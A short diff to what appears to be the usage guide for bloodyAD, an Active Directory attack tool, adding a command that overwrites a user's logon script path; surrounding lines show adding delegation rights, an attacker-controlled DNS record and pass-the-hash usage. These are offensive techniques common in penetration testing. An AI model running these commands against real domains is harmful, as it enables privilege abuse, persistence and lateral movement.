@@ -107,6 +107,10 @@ bloodyAD --host $dc -d $domain -u $username -p $password add rbcd 'DELEGATE_TO$'
 ```
 bloodyAD --host $dc -d $domain -u $username -p $password add dnsRecord $record_name $attacker_ip
 ```
+### Overwrite the logon script path
+```
+bloodyAD --host $dc -d $domain -u $username -p $password set object $DN scriptPath -v $file
+```
 ### Notes
 - Pass `-k` to use kerberos authentication
 - You can pass a user hash instead of a password using `-p :hash` 
